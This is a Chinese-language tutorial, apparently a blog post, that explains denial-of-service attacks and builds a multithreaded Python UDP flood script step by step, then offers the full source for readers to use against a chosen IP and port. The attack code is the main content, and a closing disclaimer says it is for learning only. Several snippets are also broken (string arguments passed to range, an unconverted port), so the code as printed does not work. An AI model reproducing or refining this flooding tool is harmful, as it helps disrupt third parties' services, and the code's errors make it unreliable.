# dos攻击

- [原理](#原理)
- [Python实现](#Python实现)
    - [导入库](#导入库)
    - [生成攻击数据包](#生成攻击数据包)
    - [攻击主体](#攻击主体)
    - [多线程](#多线程)
- [Python源码](#Python源码)
- [法律声明](#法律声明)

## 原理
dos攻击属于一种网络攻击手段，原理是通过向被攻击设备发送过多无用数据，导致被攻击设备无法处理这些数据，从而导致崩溃

## Python实现
我们将使用Python来实现dos攻击

废话不多说，撸起袖子就开始干
### 导入库
我们使用`socket`库来进行dos攻击，为了让攻击更具有效果，再使用`threading`库多线程

以下是代码
```python
import socket
import threading
```

### 生成攻击数据包
攻击的时候，我们要发送攻击数据包到被攻击设备，攻击数据包采用`byte`类型，即字节，以下代码，为攻击数据包部分

```python
data = '我是在攻击你' * 500
data_byte = data.encode() # 生成攻击数据包
```
生成成功啦，接下来就是攻击主体部分了

### 攻击主体部分
攻击主体部分，即为发送数据包的部分，首先，要生成一个以`UDP`协议为基础的`socket`套接字类型，为什么要选用UDP协议呢？

UDP协议不需要三次握手，速度快，传输数据没有繁多的步骤，非常适合我们dos攻击

以下是源代码

```python
so = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # 生成攻击服务器

def attack():
    # 攻击主体部分
    so.sendto(data_byte, ('Your IP', 'Your Port'))
    """
    Your IP         目标设备IP地址
    Your Port       目标设备端口，建议80
    """
```

### 多线程
虽然我们已经完成dos攻击的主要部分了，但是，威力太小，我们可以使用`多线程`,一次发送多个数据包

多线程概念：在同一时间执行多个任务

直接上代码
```python
threads = [] # 保存线程
for i in range(1, "Thread"): # 重复线程数量次
    """
    Thread: 线程数量
    """
	send = threading.Thread(target=attack, args=()) # 生成多线程类, attack为之前的攻击函数
	threads.append(send) # 添加至列表
```
## Python源码
我把源码放在这里，大家可以使用

我在之前的基础上做了些修改

```python
import socket
import threading

ip = input('IP地址：')
port = input('端口:')
thread = input('线程数量:')

data = '我是在攻击你' * 500
data_byte = data.encode() # 生成攻击数据包
so = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # 生成攻击服务器

def attack():
    so.sendto(data_byte, (ip, port))

threads = [] # 保存线程
for i in range(1, thread): # 重复线程数量次
	send = threading.Thread(target=attack, args=()) # 生成多线程类
	threads.append(send) # 添加至列表

for j in threads:
    j.start() # 启动线程
```

[源码链接](https://Rainwangpupil.github.io/Program/2022-08-20-dos_attack.py)

## 法律声明
互联网不是法外之地，这个程序仅供学习所用，如果使用者违法使用这些代码，作者不负责任